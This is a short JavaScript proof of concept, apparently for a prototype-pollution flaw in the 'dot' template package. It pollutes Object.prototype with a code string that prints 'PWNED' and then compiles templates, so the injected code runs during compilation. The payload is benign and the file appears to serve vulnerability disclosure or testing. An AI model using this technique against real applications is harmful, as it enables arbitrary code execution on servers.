var dotPkg = require("dot");

Object.prototype.aaa = 'console.log("PWNED")'

var dots = dotPkg.process({path: "./views"});
// var res = dots.mytemplate({foo:"hello world"});
// console.log(res);